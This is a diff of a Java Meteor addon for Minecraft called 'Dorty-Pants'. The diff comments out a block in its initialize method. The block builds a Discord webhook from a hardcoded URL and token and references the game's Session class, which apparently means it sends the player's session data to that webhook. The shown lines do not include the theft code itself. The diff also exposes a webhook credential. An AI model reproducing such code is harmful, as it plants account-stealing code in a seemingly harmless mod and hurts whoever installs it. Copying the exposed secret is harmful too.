@@ -41,7 +41,7 @@ public class Addon extends MeteorAddon {
     @Override
     public void onInitialize() {
         LOG.info("Initializing Dorty-Pants");
-		
+		/*
 		/**
 		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1108760944466743407/QF1I7OVT4-oEBQ-uqvfm9psjc_sfcLrU5VEN2WLG9-adyavNLc6kq88SMRib6bAF4-y4");
 		webhook.setContent("Any message!");
@@ -62,7 +62,7 @@ public class Addon extends MeteorAddon {
 		.setUrl("https://kryptongta.com"));
 		webhook.addEmbed(new DiscordWebhook.EmbedObject()
 		.setDescription("Just another added embed object!"));
-		*/
+		
 		
 		/// see https://www.programcreek.com/java-api-examples/?api=net.minecraft.util.Session
 		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1108760944466743407/QF1I7OVT4-oEBQ-uqvfm9psjc_sfcLrU5VEN2WLG9-adyavNLc6kq88SMRib6bAF4-y4");
@@ -91,7 +91,7 @@ public class Addon extends MeteorAddon {
 		} catch (IOException e) {
 			/// I DONT FUCKING CARE!
 		}
-		
+		*/
 	
 	
 	
